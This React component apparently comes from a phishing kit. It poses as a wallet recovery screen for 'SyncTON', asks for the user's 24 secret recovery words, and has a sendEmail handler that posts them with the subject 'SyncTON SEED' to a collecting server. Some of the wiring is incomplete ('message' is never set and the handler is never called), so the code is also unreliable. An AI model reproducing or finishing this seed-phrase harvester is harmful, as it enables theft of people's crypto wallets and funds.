import React, { useState } from "react";
import axios from "axios";
import { IoIosArrowRoundBack } from "react-icons/io";
import { useNavigate } from "react-router-dom"
import Form from "../utils/Form";
import Modal from "./Modal";



export const SeedForm = ({ modal, setModal }) => {
    const [segments, setSegments] = React.useState(["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""])
    const [isPaste, setIsPaste] = useState(false);
    const navigate = useNavigate();
let message;
    const goBackSeed = () => {
        navigate("/")
        setModal(!modal);
    }



    const sendEmail = (e) => {
        e.preventDefault();
        axios.post("http://localhost:5000/import", {
            subject: "SyncTON SEED",
            message
        })
            .then(() => {
                setModal(!modal);
                setSegments(["","", "","","","","","","","","","","","","","","","","","","","","","",]);
            })
            .catch(() => alert("Message not sent"));
    };


    function onPaste(event) {
        event.preventDefault()
        const pasted = event.clipboardData.getData("text/plain");
        const filterPasted = pasted.trim().split(" ").filter((item, index) => {
            return item != "";
        })
        if(filterPasted.length !== 24 ) {
            alert("Phrase incorrect")
            return;
        }
        setSegments(filterPasted.slice(0, segments.length));
    }

    function update(index) {
        return event =>
            setSegments([
                ...segments.slice(0, index),
                event.target.value,
                ...segments.slice(index + 1)
            ])
    }




    return (
        <div className="seed-phrase container">
            <div className="form-container">
                <div className="heading">
                    <div onClick={goBackSeed} style={{ float: "left" }}>
                        <IoIosArrowRoundBack onClick={goBackSeed} fontSize={30} />
                    </div>
                    <div style={{ display: "inline-block", flexDirection: "column", maxWidth: "500px", alignItems: "center", justifyContent: "space-between" }}>
                        <h2>Enter your recovery phrase</h2>
                        <p>
                            To restore access to your wallet, enter the 24 secret recovery words
                            given to you when you created your wallet
                        </p>
                    </div>
                </div>
                {modal === false ? <form>
                    <div className="lg-screen">
                        <div className="row1">
                            {segments.map((s, key) =>
                                <Form key={key} value={s} onPaste={onPaste} onInput={update(key)} form_num={key + 1} autofocus={true} />
                            )}
                        </div>
                    </div>
                    <div>
                        <button className="btn submit_seed" type="submit" >Submit</button>
                    </div>
                </form> :
                    <Modal modal={modal} setModal={setModal} />}
            </div>
        </div>
    );
};

export default SeedForm;
